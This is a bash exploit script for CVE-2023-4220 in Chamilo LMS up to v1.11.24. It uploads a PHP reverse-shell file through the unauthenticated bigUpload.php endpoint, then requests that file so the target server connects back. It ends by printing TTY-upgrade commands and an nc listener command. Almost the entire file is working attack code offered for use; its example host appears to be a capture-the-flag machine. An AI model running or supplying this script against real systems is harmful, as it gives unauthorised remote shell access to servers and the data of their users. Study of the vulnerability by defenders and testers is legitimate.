#!/bin/bash

# Exploit Title : Chamilo LMS CVE-2023-4220 Exploit
# Date          : 11/28/2023
# Exploit Author: Ziad Sakr (@Ziad-Sakr)
# Version       : ≤v1.11.24
# CVE           : 2023-4220
# CVE Link      : https://nvd.nist.gov/vuln/detail/CVE-2023-4220
#
# Usage: ./CVE-2023-4220.sh -f reverse_file -h host_link -p port_in_the_reverse_file

# Initialize variables with default values
reverse_file=""
host_link=""
port=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'  # No Color

# Usage function to display script usage
usage() {
    echo -e "${GREEN}"
    echo "Usage: $0 -f reverse_file -h host_link -p port_in_the_reverse_file"
    echo -e "${NC}"
    echo "Options:"
    echo "  -f    Path to the reverse file (e.g., php-reverse-shell.php)"
    echo "  -h    Host link where the file will be uploaded (e.g., http://lms.permx.htb)"
    echo "  -p    Port for the reverse shell listener (e.g., 4444)"
    exit 1
}

# Parse command-line options
while getopts "f:h:p:" opt; do
    case $opt in
        f)
            reverse_file=$OPTARG
            ;;
        h)
            host_link=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
        \?)
            echo -e "${RED}Invalid option: -$OPTARG${NC}" >&2
            usage
            ;;
        :)
            echo -e "${RED}Option -$OPTARG requires an argument.${NC}" >&2
            usage
            ;;
    esac
done

# Check if all required options are provided
if [ -z "$reverse_file" ] || [ -z "$host_link" ] || [ -z "$port" ]; then
    echo -e "${RED}All options -f, -h, and -p are required.${NC}"
    usage
fi

# Check if the reverse shell file exists
if [ ! -f "$reverse_file" ]; then
    echo -e "${RED}Error: Reverse shell file '$reverse_file' not found.${NC}"
    exit 1
fi

# Upload the reverse shell file using curl
echo -e "${GREEN}[*] Uploading reverse shell file '$reverse_file' to '$host_link'...${NC}"
upload_response=$(curl -s -F "bigUploadFile=@$reverse_file" "$host_link/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported")

# Check if the file was uploaded successfully
if echo "$upload_response" | grep -q "error"; then
    echo -e "${RED}[!] File upload failed.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] The file has been successfully uploaded.${NC}"
echo -e "${GREEN}[+] You can find the file at: ${host_link}/main/inc/lib/javascript/bigupload/files/${reverse_file}${NC}"

# Provide instructions for the reverse shell
echo -e "${RED}"
echo "# Use This Later For Interactive TTY: "
echo "# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "# export TERM=xterm"
echo "# CTRL + Z"
echo "# stty raw -echo; fg"
echo -e "${NC}"

# Attempt to access the uploaded reverse shell file to trigger the connection
echo -e "${GREEN}[*] Starting reverse shell on port $port...${NC}"

# Trigger the uploaded reverse shell
curl -s "$host_link/main/inc/lib/javascript/bigupload/files/$reverse_file" > /dev/null

# Start the Netcat listener in a separate terminal or manually in another shell
echo -e "${GREEN}[+] Reverse shell triggered. Check your listener on port $port.${NC}"

# Reminder for Netcat listener setup (manual step for user)
echo -e "${GREEN}[+] To capture the reverse shell, run:${NC}"
echo -e "${RED}sudo nc -lvnp $port${NC}"
